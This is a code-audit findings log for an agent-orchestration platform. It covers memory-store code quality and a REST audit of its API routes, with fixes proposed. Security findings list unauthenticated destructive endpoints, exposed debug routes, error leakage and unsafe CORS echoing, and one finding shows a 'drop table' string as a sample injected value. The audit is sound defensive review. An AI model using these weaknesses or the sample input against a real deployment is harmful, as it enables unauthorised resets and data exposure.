#### F-411 🟠 [perf] · No index hint on `cosineDistance` pgvector queries
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:150, 239-241`.
- **Observation:** full-table scans on every retrieval. Add HNSW/IVFFlat index + query hint.

#### F-412 🟡 [code] · Hardcoded 384 embedding dim without assertion on output
- **Where:** `packages/hippocampus/src/backends/embedding.ts:4, 36`.
- **Observation:** if the model changes dimension silently, downstream SQL fails cryptically. Assert at boot.

#### F-413 🟡 [code] · Magic decay formula `0.5^(age/30)` duplicated
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:241-243, 295, 414`.
- **Observation:** same formula in 3 raw SQL sites; one tuning change misses two.

#### F-414 🟡 [code] · Hardcoded confidence tiers (0.8/0.6/0.4, 0.3/0.6/0.4)
- **Where:** `packages/hippocampus/src/service.ts:25`.
- **Observation:** success/partial/failure mapped without named constants; F-318 family.

#### F-415 🟡 [code] · 30-day expiry vs 7-day creation window mismatch
- **Where:** `packages/hippocampus/src/service.ts:28` vs GC at `pgvector.ts:414`.
- **Observation:** temporal facts created with a 7-day TTL but GC window runs every 30 days; most facts stale before GC.

#### F-416 🟡 [code] · Hardcoded tier boost table
- **Where:** `packages/hippocampus/src/engines/retrieval.ts:10-15`.
- **Observation:** `{ static: 1.5, dynamic: 1.0 }` inline; no config, no rationale.

#### F-417 🟡 [code] · Magic 50-item `list()` limit
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:102, 192, 434`.
- **Observation:** no pagination — agent with >50 memories silently truncated.

#### F-418 🟡 [code] · `summary: content.slice(0, 200)` truncation
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:22` and 4 other sites.
- **Observation:** F-094 family.

#### F-419 🟡 [code] · Retrieval falls back to 1.0 similarity silently
- **Where:** `packages/hippocampus/src/engines/retrieval.ts:103-110`.
- **Observation:** when embeddings absent, MMR disabled and everything treated as max-sim. No warning — ranking quietly degrades.

#### F-420 🟡 [code] · Confusing naming: `StaticMemoryStore` vs `DynamicMemoryStore`
- **Where:** `packages/hippocampus/src/types.ts:69-128`.
- **Observation:** interface names suggest symmetry but contracts asymmetric (GC on Dynamic only).

#### F-421 🟢 [code] · Dead `scopeBoost` multiplier always 1.0
- **Where:** `packages/hippocampus/src/engines/retrieval.ts:53-55`.
- **Observation:** comment says "Phase 4+" — remove until used.

#### F-422 🟢 [code] · `__embedding` stash + immediate delete
- **Where:** `packages/hippocampus/src/engines/retrieval.ts:145-146, 152-154`.
- **Observation:** serves no purpose; remove.

#### F-423 🟢 [code] · No audit on habit GC deactivation
- **Where:** `packages/hippocampus/src/backends/pgvector.ts:404-420`.
- **Observation:** habits flipped inactive silently — operator has no trail.

---

## Files covered so far

- `apps/api/src/server.ts` — complete (42 flaws across 6 sections)
- `apps/api/src/orchestration/state.ts` — complete (20 flaws, F-043 through F-062)
- `apps/api/src/infra/opencode.ts` — complete (23 flaws, F-063 through F-085)
- `apps/api/src/persistence/control-plane.ts` — complete (32 flaws, F-086 through F-117)
- `apps/api/src/infra/{azure-openai,resilience}.ts` — complete (25 flaws, F-118 through F-142)
- `apps/api/src/persistence/store.ts` — complete (30 flaws, F-143 through F-172)
- `packages/db/*` — complete (30 flaws, F-173 through F-202)
- `packages/company-runtime/src/heartbeat.ts` — complete (35 flaws, F-203 through F-237)
- `packages/company-runtime/src/heartbeat-checklist.ts` — complete (17 flaws, F-238 through F-254)
- `apps/api/src/heartbeats/beat-executor.ts` — complete (19 flaws, F-255 through F-273)
- `apps/api/src/heartbeats/checklist-executor.ts` — complete (15 flaws, F-274 through F-288)
- `apps/api/src/heartbeats/event-bridge.ts` — complete (16 flaws, F-289 through F-304)
- `apps/api/src/orchestration/{bootstrap,execution-cycle,reactive}.ts` — complete (10 flaws, F-305 through F-314)
- `apps/api/src/agents/{ceo,chat,sessions}.ts` — complete (15 flaws, F-315 through F-329)
- `apps/api/src/skills/*` + `packages/company-runtime/src/skill-*.ts` — complete (15 flaws, F-330 through F-344)
- `apps/api/src/sprints/*` — complete (14 flaws, F-345 through F-358)
- `apps/api/src/meetings/*` + `packages/company-runtime/src/meeting-*.ts` — complete (15 flaws, F-359 through F-373)
- `apps/api/src/tasks/*` + `packages/task-engine/*` — complete (17 flaws, F-374 through F-390)
- `apps/api/src/prompts/*` + `apps/api/src/observability/*` — complete (15 flaws, F-391 through F-405)
- `packages/hippocampus/*` — complete (18 flaws, F-406 through F-423)

---

### apps/api/src/routes/*.ts — REST / API-principle audit

#### F-424 🔴 [api][sec] · Mutation endpoints ship without authentication
- **Where:** `apps/api/src/routes/company.routes.ts:46 (DELETE /api/company)`, `apps/api/src/routes/heartbeat.routes.ts:15, 21, 27, 80`, `apps/api/src/routes/orchestrator.routes.ts:30, 46, 60, 72`, `apps/api/src/routes/strategy.routes.ts:18, 32, 45, 68`, `apps/api/src/routes/workspace.routes.ts:67, 83`.
- **Observation:** every destructive or state-mutating POST/PATCH/DELETE is unauthenticated — `DELETE /api/company` wipes the entire company, `POST /api/quick-execute` bootstraps + starts the engine, `POST /api/heartbeat/stop` halts execution. No bearer token, no API key, no session check. Any network-reachable client can reset production.
- **Proposed fix:** add Fastify `preHandler` auth guard on every non-read-only route; introduce a role-based policy (board / operator / anonymous).

#### F-425 🔴 [api][status] · HTTP 200 returned for not-found / error paths
- **Where:** `apps/api/src/routes/skills.routes.ts:79 ("not found"), :163, :229, :233`; `apps/api/src/routes/service-registry.routes.ts:27, 42`; `apps/api/src/routes/hippocampus.routes.ts:50, 100, 118`.
- **Observation:** multiple routes return `{ error: "..." }` without setting a 4xx status. Client receives 200 with an error body; retry logic and monitoring cannot distinguish success from failure. Example: `app.get("/api/skills/mutations/:id")` returns `{ error: "not found" }` at HTTP 200.
- **Proposed fix:** set `reply.code(404)` / `409` / `422` and return `{ error: { code, message } }` envelope.

#### F-426 🔴 [api][validation] · Untyped `request.body as {...}` casts across 10+ routes
- **Where:** `apps/api/src/routes/skills.routes.ts:91, 160, 224`; `apps/api/src/routes/heartbeat.routes.ts:81`; `apps/api/src/routes/governance.routes.ts:37, 138`; `apps/api/src/routes/orchestrator.routes.ts:75`; `apps/api/src/routes/hippocampus.routes.ts:9, 47`; `apps/api/src/routes/control-plane.routes.ts:*`; `apps/api/src/routes/service-registry.routes.ts`.
- **Observation:** cast bypasses Fastify JSON Schema and Zod. Malformed payloads flow through to mutation code; `body.assignedRole` at `skills.routes.ts:95` is `string` but treated as `AgentIdentity["role"]` enum downstream.
- **Proposed fix:** Zod schema per endpoint; Fastify `route.schema.body` for JSON-schema validation; bundled with F-030/F-396.

#### F-427 🔴 [api][reliability] · Mutation in GET handlers (`seedExistingSkills`)
- **Where:** `apps/api/src/routes/skills.routes.ts:18, 41, 50, 103, 254, 267`.
- **Observation:** `GET /api/skills`, `GET /api/skills/health`, `GET /api/skills/:name/history`, `GET /api/skills/unused`, `GET /api/skills/underperforming` all call `seedExistingSkills(companyId)` on read. Reads are no longer safe/idempotent — cache invalidation, monitoring crawlers, and retry policies assume GETs are side-effect-free.
- **Proposed fix:** move seeding to `POST /api/skills/seed` (explicit) or an on-bootstrap one-shot; GET must be read-only.

#### F-428 🔴 [api][sec] · Debug + internal endpoints exposed without gating
- **Where:** `apps/api/src/routes/debug.routes.ts` (entire file), `apps/api/src/routes/hippocampus.routes.ts:8 (POST /api/hippocampus/seed)`, `:46 (/test-extraction)`, `apps/api/src/routes/skills.routes.ts:90 (/simulate-task-outcome)`, `apps/api/src/routes/governance.routes.ts:50 (/cleanup)`, `:137 (/check)`.
- **Observation:** debug/seed/simulate/cleanup endpoints mounted unconditionally on the same HTTP surface as production traffic. `/api/debug/graph/stream` leaks internal graph state; `/api/hippocampus/seed` is a destructive operation that rehydrates agent memories.
- **Proposed fix:** gate behind `NODE_ENV !== "production"` or `X-Arceus-Admin-Token` header; move to a separate mount (`/_debug/*`) excluded from prod ingress.

#### F-429 🔴 [api][sec][obs] · Information leakage via raw `err.message`
- **Where:** `apps/api/src/routes/company.routes.ts:84`; `apps/api/src/routes/orchestrator.routes.ts:55, 67, 91`; `apps/api/src/routes/strategy.routes.ts:27, 40, 58, 89`; `apps/api/src/routes/sprints.routes.ts:28`.
- **Observation:** catch blocks return `error: error instanceof Error ? error.message : "..."` directly to the client. Database errors, stack traces, file paths, and internal state names leak through. OWASP A09 violation.
- **Proposed fix:** return `{ error: { code: "internal_error", message: "…generic…" } }`; log full details server-side with a correlation id.

#### F-430 🟠 [api][design] · Verbs in URLs throughout the surface
- **Where:** `POST /api/skills/mutations/:id/run-ata`, `POST /api/patterns/promote/:clusterId`, `POST /api/patterns/sweep`, `POST /api/skills/simulate-task-outcome`, `POST /api/quick-execute`, `POST /api/orchestrator/execute`, `POST /api/heartbeat/trigger`, `POST /api/workspace/sync`, `POST /api/hippocampus/seed`, `POST /api/hippocampus/test-extraction`, `POST /api/governance/check`, `POST /api/governance/trust-scores/cleanup`, `POST /api/board-review/approve`, `POST /api/approvals/:id/resolve`.
- **Observation:** mixes resource + action routing. Some follow `/:id/action` (acceptable RPC-style) but many are flat verbs (`/quick-execute`, `/sweep`, `/execute`). No consistency.
- **Proposed fix:** adopt a policy — resource/action-verb for side effects (`POST /sprints/:id:approve`) or a dedicated `/commands/*` namespace; document in an API-conventions file.

#### F-431 🟠 [api][design] · Response envelope varies per endpoint
- **Where:** bare object (`/api/company`), `{ skills, total }` (`/api/skills`), bare array (`/api/sprints`, `/api/tasks`, `/api/meetings`), `{ data: T }` pattern absent everywhere.
- **Observation:** no common envelope. Client SDKs cannot generically parse responses; pagination metadata has no defined slot.
- **Proposed fix:** adopt `{ data, meta?, links? }` for collections; bare resource for single-item GET; standardize via a `respond()` helper.

#### F-432 🟠 [api][perf] · Unbounded list responses across all collection routes
- **Where:** `GET /api/artifacts`, `/api/employees`, `/api/employee-memories`, `/api/employee-activity`, `/api/activity`, `/api/sprints`, `/api/tasks`, `/api/meetings`, `/api/skills`, `/api/skills/mutations`, `/api/patterns`, `/api/patterns/clusters`, `/api/transitions`, `/api/feedback-rounds`, `/api/workspace/snapshots`, `/api/governance/trust-scores`.
- **Observation:** no pagination, no limit parameter, no `meta.total`. A company with 10k tasks returns a 10k-element JSON blob on every dashboard render.
- **Proposed fix:** add `?limit=` + `?cursor=` with a sensible default (50) and a hard cap (500).

#### F-433 🟠 [api][validation] · `role: z.string()` accepts any value
- **Where:** `apps/api/src/routes/heartbeat.routes.ts:30, 51`; `apps/api/src/routes/skills.routes.ts:95`; `apps/api/src/routes/governance.routes.ts:140, 149`.
- **Observation:** role parameters typed as `z.string()` and then cast to `AgentIdentity["role"]` via `as any`. Typos + injection vectors slip past. F-098 family.
- **Proposed fix:** export `AgentRoleEnum = z.enum([...])` from contracts; use it everywhere.

#### F-434 🟠 [api][validation] · `parseInt(query.limit)` / `Number(...)` with no NaN / range check
- **Where:** `apps/api/src/routes/audit.routes.ts:24`; `apps/api/src/routes/heartbeat.routes.ts:74`; `apps/api/src/routes/governance.routes.ts:67`; `apps/api/src/routes/skills.routes.ts:270, 281`.
- **Observation:** `Number(query.limit)` yields `NaN` for non-numeric input; `Math.min(NaN, 500)` is `NaN` — passed to LIMIT clauses unpredictably. No lower bound either (negative limits accepted).
- **Proposed fix:** `z.coerce.number().int().min(1).max(500)` per query schema.

#### F-435 🟠 [api][design] · No 409 on concurrent/conflicting operations
- **Where:** `POST /api/heartbeat/trigger` returns 200 with `{ status: "skipped", reason: "..." }` at `heartbeat.routes.ts:55`.
- **Observation:** "beat was skipped because it was locked" is a concurrency rejection — should be 409 Conflict or 429 Too Many Requests, not 200. Client monitoring cannot distinguish success from throttling.
- **Proposed fix:** `reply.code(409); return { error: { code: "beat_locked", ... } }`.

#### F-436 🟠 [api][design] · `POST /api/company/bootstrap` returns 201 without `Location` header
- **Where:** `apps/api/src/routes/company.routes.ts:34-44`.
- **Observation:** correctly sets 201 but doesn't emit `Location: /api/company/{id}` header for the newly created resource — RFC 7231 §7.1.2 expectation.
- **Proposed fix:** `reply.header("Location", \`/api/company/${snapshot.company.id}\`)`.

#### F-437 🟠 [api][design] · `DELETE /api/company` returns 200 with body
- **Where:** `apps/api/src/routes/company.routes.ts:79`.
- **Observation:** returns `resetCompany()` snapshot instead of `204 No Content`. Fine if documented as "resource replaced with empty company"; ambiguous otherwise.
- **Proposed fix:** either `reply.code(204).send()` or document as "reset — returns new empty company snapshot."

#### F-438 🟠 [api][validation] · `body.action ?? "approved"` silently defaults destructive flag
- **Where:** `apps/api/src/routes/orchestrator.routes.ts:72-87 (POST /api/approvals/:id/resolve)`.
- **Observation:** missing `action` in body defaults to `"approved"` — a misfired or empty request approves an approval by accident. Action defaults should be explicit or absent → 400.
- **Proposed fix:** Zod required `action: z.enum(["approved", "rejected"])`.

#### F-439 🟠 [api][design] · `PATCH /api/heartbeat/config` whitelist copy via `body[key]`
- **Where:** `apps/api/src/routes/heartbeat.routes.ts:80-93`.
- **Observation:** iterates allow-list keys but copies value as `unknown`. A client sending `{ maxConcurrentBeats: "drop table" }` passes through to `patchConfig` which then does runtime-checking only partially.
- **Proposed fix:** per-field Zod schema; reject on bad type with 400.

#### F-440 🟠 [api][design] · Cross-mount path prefix inconsistency
- **Where:** most routes use `/api/*`; `/api/debug/*` routes mixed with non-`/api` paths exist (index.ts exports + server.ts).
- **Observation:** no explicit `/api/v1` versioning; when a breaking change ships the client has no migration path.
- **Proposed fix:** mount under `/api/v1/` now, before public release; add `Sunset` header machinery for deprecation.

#### F-441 🟠 [api][design] · Duplicate endpoints with overlapping semantics
- **Where:** `GET /api/employee-activity` + `GET /api/activity` (alias), `GET /api/employee-activity/stream` + `GET /api/activity/stream` (alias); `POST /api/heartbeat/start` vs `POST /api/orchestrator/execute` — both start the engine.
- **Observation:** aliases increase API surface area; future refactor touches two code paths.
- **Proposed fix:** pick one canonical path; redirect or deprecate the other with `Sunset`.

#### F-442 🟠 [api][reliability] · SSE streams write-on-broken-pipe with empty catch
- **Where:** `apps/api/src/routes/debug.routes.ts:77-79`; `apps/api/src/routes/chat.routes.ts:39`; `apps/api/src/routes/audit.routes.ts:51, 57`; `apps/api/src/routes/company.routes.ts:89` (no heartbeat at all).
- **Observation:** write errors caught with `catch { /* stream broken */ }`; subscriber not always unsubscribed on error — F-394 family. `/api/events` does not emit heartbeat frames — load-balancers idle-kill after 30s.
- **Proposed fix:** standard SSE helper (`streamSse(reply, channel)`) that writes keepalives, handles `close`, and unsubscribes.

#### F-443 🟠 [api][validation] · Magic `default()` values inside Zod schemas
- **Where:** `apps/api/src/routes/workspace.routes.ts:75-77`: `taskId: z.string().default("manual_sync")`, `agentRole: z.string().default("system")`, `message: z.string().default("Manual workspace sync requested.")`.
- **Observation:** defaults inject magic constants into audit rows and git commits without caller's knowledge. If a frontend forgets the field, the DB ends up littered with `"system"` agents that never existed.
- **Proposed fix:** make fields required or document defaults in API contract.

#### F-444 🟡 [api][design] · `/api/debug/graph/stream` exposes internal graph over SSE
- **Where:** `apps/api/src/routes/debug.routes.ts:52-86`.
- **Observation:** sprint graph stream leaks internal decision nodes + execution topology. Combined with F-428 (no auth), it's a competitive-intel exfil path.
- **Proposed fix:** same as F-428 — gate debug surface.

#### F-445 🟡 [api][design] · `(trigger as any).scheduledAt = ...` mutates parsed body
- **Where:** `apps/api/src/routes/heartbeat.routes.ts:45`.
- **Observation:** Zod-parsed object mutated in place with `as any` cast. Bypasses schema; breaks immutability. F-143/F-328 family.
- **Proposed fix:** build a new `trigger` object; use `z.object(...).transform(...)` to fill defaults.

#### F-446 🟡 [api][design] · Non-paginated slice windows (`slice(-50)`, `limit 200`)
- **Where:** `apps/api/src/routes/debug.routes.ts:22 (getTransitions().slice(-50))`; `apps/api/src/routes/governance.routes.ts:86 (limit: 200)`.
- **Observation:** magic caps with no metadata on `total` or next-cursor. Caller cannot tell there are more.
- **Proposed fix:** named constants + meta.

#### F-447 🟡 [api][design] · Mixing success + error fields in a single response
- **Where:** `apps/api/src/routes/preview.routes.ts:11` — returns `{ status, url, entryUrl, error }` with both populated.
- **Observation:** client must inspect multiple fields to tell success from failure; no HTTP status signal.
- **Proposed fix:** use status codes + discriminated union envelope.

#### F-448 🟡 [api][validation] · `GET /api/workspace/diff` accepts `from`/`to` without ordering check
- **Where:** `apps/api/src/routes/workspace.routes.ts:57-63`.
- **Observation:** coerces positive ints but does not verify `from < to`; reversed range silently produces empty diff.
- **Proposed fix:** `.refine((q) => q.from < q.to, "from must be < to")`.

#### F-449 🟡 [api][design] · `GET /api/events` streams historical events in one shot then ends
- **Where:** `apps/api/src/routes/company.routes.ts:89-102`.
- **Observation:** function name + `Content-Type: text/event-stream` imply a live SSE stream, but the handler iterates `getEvents()` and calls `reply.raw.end()`. This is a batched push over SSE — misleading for clients expecting live updates.
- **Proposed fix:** rename to `GET /api/events/history` (JSON array) or convert to a true live stream with subscription.

#### F-450 🟡 [api][sec] · CORS origin echoed back unconditionally
- **Where:** `apps/api/src/routes/company.routes.ts:94`; `apps/api/src/routes/debug.routes.ts:59`; `apps/api/src/routes/audit.routes.ts:*`.
- **Observation:** `reply.raw.setHeader("Access-Control-Allow-Origin", request.headers.origin || "*")` with `Allow-Credentials: true`. Any origin (including malicious ones) can read SSE payloads — CORS bypass pattern.
- **Proposed fix:** validate origin against an allow-list before echoing; fail closed.

#### F-451 🟡 [api][design] · `POST /api/company/bootstrap` returns the full snapshot
- **Where:** `apps/api/src/routes/company.routes.ts:43`.
- **Observation:** 201 with the entire mutable store state — every caller caches the snapshot. Better to return the created resource id + minimal payload; client fetches the snapshot via a separate GET.
- **Proposed fix:** return `{ id, createdAt, links: { self: "/api/company/:id" } }`.

#### F-452 🟡 [api][design] · `POST /api/strategy/execute` bundles parse + apply + start-engine
- **Where:** `apps/api/src/routes/strategy.routes.ts:45-61`.
- **Observation:** one endpoint performs three conceptual steps; failure mode unclear (strategy applied but engine start failed → partial state).
- **Proposed fix:** split into `POST /api/strategy` (create), `POST /api/strategy/:id:apply`, `POST /api/orchestrator:start`. Or accept coupling + document rollback.

#### F-453 🟡 [api][validation] · `body.kind as any` in governance trust-score adjust
- **Where:** `apps/api/src/routes/governance.routes.ts:41`.
- **Observation:** `buildTrustEvent(..., body.kind as any, ...)`. Invalid kinds (typos, injection) reach the event builder unchallenged.
- **Proposed fix:** `TrustEventKindEnum`.

#### F-454 🟡 [api][design] · `GET /api/skills/sprint-candidates/:sprintId` mixes resource + query in URL
- **Where:** `apps/api/src/routes/skills.routes.ts:277`.
- **Observation:** `sprint-candidates` is a verb-ish compound; could be `GET /api/sprints/:sprintId/skill-candidates` to express the ownership hierarchy.
- **Proposed fix:** nest under the sprints resource.

#### F-455 🟡 [api][design] · No rate limiting on any route
- **Where:** all routes.
- **Observation:** no `@fastify/rate-limit` plugin, no `X-RateLimit-*` headers. `POST /api/quick-execute` can be replayed to exhaust LLM budget.
- **Proposed fix:** global limiter + per-endpoint overrides for expensive routes (LLM-backed POSTs).

#### F-456 🟡 [api][design] · Missing `OPTIONS` + preflight config
- **Where:** all routes; no `@fastify/cors` plugin registration observed in `server.ts`.
- **Observation:** CORS handled ad-hoc in SSE handlers (F-450); browser requests from a different origin fail preflight.
- **Proposed fix:** install `@fastify/cors` with an allow-list.

#### F-457 🟡 [api][design] · `POST /api/patterns/promote/:clusterId` silently returns 200 on missing candidate
- **Where:** `apps/api/src/routes/skills.routes.ts:226-231`.
- **Observation:** `"No promotable candidate for cluster ${id}"` returned with HTTP 200.
- **Proposed fix:** `reply.code(404)` for missing candidate.

#### F-458 🟢 [api][design] · Route-plugin option-injection asymmetry
- **Where:** `orchestrator.routes.ts`, `strategy.routes.ts`, `heartbeat.routes.ts`, `company.routes.ts` accept `HeartbeatRouteDeps`; others pull module-level singletons via imports.
- **Observation:** inconsistent DI — half the file uses Fastify plugin options, half uses imports. Testing + mocking harder.
- **Proposed fix:** one pattern everywhere; prefer Fastify plugin options.

---

## Files covered so far

- `apps/api/src/server.ts` — complete (42 flaws across 6 sections)
- `apps/api/src/orchestration/state.ts` — complete (20 flaws, F-043 through F-062)
- `apps/api/src/infra/opencode.ts` — complete (23 flaws, F-063 through F-085)
- `apps/api/src/persistence/control-plane.ts` — complete (32 flaws, F-086 through F-117)
- `apps/api/src/infra/{azure-openai,resilience}.ts` — complete (25 flaws, F-118 through F-142)
- `apps/api/src/persistence/store.ts` — complete (30 flaws, F-143 through F-172)
- `packages/db/*` — complete (30 flaws, F-173 through F-202)
- `packages/company-runtime/src/heartbeat.ts` — complete (35 flaws, F-203 through F-237)
- `packages/company-runtime/src/heartbeat-checklist.ts` — complete (17 flaws, F-238 through F-254)
- `apps/api/src/heartbeats/beat-executor.ts` — complete (19 flaws, F-255 through F-273)
- `apps/api/src/heartbeats/checklist-executor.ts` — complete (15 flaws, F-274 through F-288)
- `apps/api/src/heartbeats/event-bridge.ts` — complete (16 flaws, F-289 through F-304)
- `apps/api/src/orchestration/{bootstrap,execution-cycle,reactive}.ts` — complete (10 flaws, F-305 through F-314)
- `apps/api/src/agents/{ceo,chat,sessions}.ts` — complete (15 flaws, F-315 through F-329)
- `apps/api/src/skills/*` + `packages/company-runtime/src/skill-*.ts` — complete (15 flaws, F-330 through F-344)
- `apps/api/src/sprints/*` — complete (14 flaws, F-345 through F-358)
- `apps/api/src/meetings/*` + `packages/company-runtime/src/meeting-*.ts` — complete (15 flaws, F-359 through F-373)
- `apps/api/src/tasks/*` + `packages/task-engine/*` — complete (17 flaws, F-374 through F-390)
- `apps/api/src/prompts/*` + `apps/api/src/observability/*` — complete (15 flaws, F-391 through F-405)
- `packages/hippocampus/*` — complete (18 flaws, F-406 through F-423)
- `apps/api/src/routes/*.ts` — complete (35 flaws, F-424 through F-458)
